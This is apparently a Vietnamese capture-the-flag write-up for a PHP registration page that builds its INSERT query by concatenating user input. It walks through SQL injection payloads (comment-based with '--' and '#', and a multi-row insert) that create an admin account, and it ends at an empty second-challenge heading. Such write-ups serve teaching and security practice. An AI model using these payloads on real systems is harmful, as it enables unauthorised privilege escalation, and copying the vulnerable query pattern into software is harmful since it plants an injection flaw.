# Chall 1 :
Chúng ta có một đoạn source code của register như sau :
```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $db = new mysqli($db_host, $db_user, $db_password, $db_schema);

        $username = $_POST['username'];
        $password = $_POST['password'];

        $sql = "INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);";

        if ($db->query($sql) === TRUE) {
            echo '<div class="alert alert-success" role="alert">Ti sei registrato! Puoi ora fare login</div>';
        } else {
            echo '<div class="alert alert-danger" role="alert">Error: ' . $sql . "<br>" . $db->error . "</div>";
        }
        $db->close();
    }
?>
```
Ta có dòng code :
```php
$sql = "INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);";
```
Đầu  tiên là cấu trúc chuỗi / nối chuỗi trong PHP : 
* PHP dùng toán tử `.` để nối chuỗi.
* Chuỗi bắt đầu bằng `"INSERT ... VALUES ('"`, rồi nối `$username`, rồi nối `"','"`, rồi nối `$password`, rồi nối `',false);'`.

Kết quả là một chuỗi SQL hoàn chỉnh (ví dụ nếu `$username = ntthanhh`, `$password = thanh` thì chuỗi sẽ là):
```sql
INSERT INTO users(username,password,admin) VALUES ('ntthanhh','thanh',false);
```
Ý nghĩa về SQL : 
* `INSERT INTO users(username,password,admin)` — chèn một hàng mới vào bảng `users` với ba cột `username`, `password`, `admin`.
* `VALUES ('ntthanhh','thanh',false)` — đặt `username='ntthanhh'`, `password='thanh'`, `admin=false`.
* Ở MySQL, false là một hằng tương đương 0 (số), còn true tương đương 1. Ở đây false không được đặt trong dấu nháy, nên là một giá trị boolean/number trong SQL, không phải chuỗi.

**Chúng ta có payload sau :** `username = ntthanhh', 'thanh', 1) --`
Thay vào trong template sẽ cho SQL : 
```sql
INSERT INTO users(username,password,admin) VALUES ('ntthanhh','thanh',true); -- ','thanh',false);
```
Phần `--` trong SQL là comment: MySQL sẽ bỏ qua phần sau `--`. Vậy thực tế server chạy:
```sql
INSERT INTO users(username,password,admin) VALUES ('ntthanhh','thanh',true);
```
**Nhưng server báo thông báo lỗi sau :**
```
Error: INSERT INTO users(username,password,admin) VALUES ('ntthanhh', 'thanh', 1) --','thanh',false);
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--','thanh',false)' at line 1
```
Lỗi này xảy ra vì trong MySQL/MariaDB, cú pháp comment bằng dấu gạch đôi `--` bắt buộc phải có một dấu cách (khoảng trắng) đi ngay sau nó.
Nhìn vào thông báo lỗi của bạn: `near '--','thanh',false)'`, ta thấy dấu `--` đang dính liền với dấu phẩy `'`, nghĩa là khoảng trắng đã bị mất (có thể do hàm `trim()` của PHP tự động cắt bỏ khoảng trắng thừa ở đầu và cuối khi nhận dữ liệu).
Để khắc phục, bạn hãy thay thế `--` bằng dấu thăng `#` (vì dấu `#` trong MySQL không yêu cầu khoảng trắng phía sau).
**Chúng ta có Payload mới :** `username = ntthanhh', 'thanh', 1) #`
Khi đó câu lệnh SQL sẽ trở thành:
```sql
INSERT INTO users(username,password,admin) VALUES ('ntthanhh', 'thanh', 1) #','thanh',false);
```
Dấu `#` sẽ biến toàn bộ phần rác phía sau `','thanh',false);` thành comment. Database sẽ chỉ thực thi đoạn chèn user `ntthanhh` với quyền admin là 1 (True).
**Nếu dấu `#` bị chặn chúng ta có một cách khác :**
Dùng kỹ thuật Multi-Insert (Chèn nhiều dòng) để biến câu lệnh thành hợp lệ mà không cần comment:
**Chúng ta có Payload :** `username = ntthanhh', 'thanh', 1), ('ntthanhh1`
Lúc này câu lệnh SQL sẽ thành:
```sql
INSERT INTO users(username,password,admin) VALUES ('ntthanhh', 'thanh', 1), ('ntthanhh1', 'thanh', false);
```
Hệ thống sẽ thực hiện chèn 2 người dùng cùng lúc:
* ntthanhh : Do chúng ta chèn vào, có quyền Admin (1).
* ntthanhh1 : Do code gốc xử lý, là user thường (false).

$\rightarrow$ Chúng ta đã tạo được một tài khoản với `username : ntthanhh`, `password : thanh` và với quyền của `admin`. Bây giờ chúng ta có thể đăng nhập với quyền của admin và lấy flag.

---

# Chall 2 :
